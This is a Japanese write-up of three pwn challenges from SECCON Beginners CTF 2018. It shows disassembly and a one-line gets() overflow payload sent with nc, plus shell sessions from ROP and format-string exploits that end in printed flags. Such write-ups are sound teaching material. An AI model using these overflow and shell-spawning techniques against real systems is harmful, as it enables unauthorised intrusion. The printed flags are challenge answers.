SECCON BeginnersCTF 2018 pwn問題のwriteupです。

***

# [Warmup] condition 85 point

## Question

```
あなたは flag にアクセスする権限を持っていますか？
Host: pwn1.chall.beginners.seccon.jp
Port: 16268
```

実行すると名前を入力を求められる。適当に入れるとパーミッションないとのこと。
```
$ ./condition 
Please tell me your name...AAAAAAAAAAA
Permission denied

```

objdumpでmain関数をみてみる。getsで入力した値と0xdeadbeefを比較して同一であればフラグが表示される。
```
0000000000400771 <main>:
  400771:	55                   	push   rbp
  400772:	48 89 e5             	mov    rbp,rsp
  400775:	48 83 ec 30          	sub    rsp,0x30
  400779:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  400780:	bf d8 08 40 00       	mov    edi,0x4008d8
  400785:	b8 00 00 00 00       	mov    eax,0x0
  40078a:	e8 71 fe ff ff       	call   400600 <printf@plt>
  40078f:	48 8d 45 d0          	lea    rax,[rbp-0x30]
  400793:	48 89 c7             	mov    rdi,rax
  400796:	b8 00 00 00 00       	mov    eax,0x0
  40079b:	e8 80 fe ff ff       	call   400620 <gets@plt>
  4007a0:	81 7d fc ef be ad de 	cmp    DWORD PTR [rbp-0x4],0xdeadbeef <---- ここで比較している
  4007a7:	75 16                	jne    4007bf <main+0x4e>
  4007a9:	bf f8 08 40 00       	mov    edi,0x4008f8
  4007ae:	e8 0d fe ff ff       	call   4005c0 <puts@plt>
  4007b3:	bf 1e 09 40 00       	mov    edi,0x40091e
  4007b8:	e8 16 00 00 00       	call   4007d3 <read_file>
  4007bd:	eb 0a                	jmp    4007c9 <main+0x58>
  4007bf:	bf 27 09 40 00       	mov    edi,0x400927
  4007c4:	e8 f7 fd ff ff       	call   4005c0 <puts@plt>
  4007c9:	bf 00 00 00 00       	mov    edi,0x0
  4007ce:	e8 6d fe ff ff       	call   400640 <exit@plt>
```

getsの入力はrbp-0x30から始まり、0xdeadbeefとの比較はrbp-0x4の値とおこなわれる。0x30-0x4 = 44バイトなので、44バイト適当にパディングして、0xdeadbeefを入力する。

```
$ python -c 'print "\x00"*44+"\xef\xbe\xad\xde"'|nc pwn1.chall.beginners.seccon.jp 16268
Please tell me your name...OK! You have permission to get flag!!
ctf4b{T4mp3r_4n07h3r_v4r14bl3_w17h_m3m0ry_c0rrup710n}
```

***
# BBS 304 point

```
$ python exp_bbs.py -r
libc:  0x7f2d59871000
binsh:  0x7f2d599fdd57
Input Content : 
==============================

Sun May 27 13:48:27 JST 2018
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAc@

==============================
id
uid=20209 gid=20000(bbs) groups=20000(bbs)
ls
bbs
flag.txt
cat flag.txt
ctf4b{Pr3p4r3_4rgum3n75_w17h_ROP_4nd_c4ll_4rb17r4ry_func710n5}

```

***
# Seczon 388 point

```
$ python exp_seczon.py -r
libc:  0xf7609000
system:  0xf7643da0
free_hook:  0xf77bc8b0
0x3da0
0xf764
 Confirmation
sh


Action:
>>   
id
uid=30125 gid=30000(seczon) groups=30000(seczon)
ls
flag.txt
seczon
cat flag.txt
ctf4b{F0rm4t_5tr!ng_Bug_w!th_4lr3ady_pr!nt3d_d4t4}
```
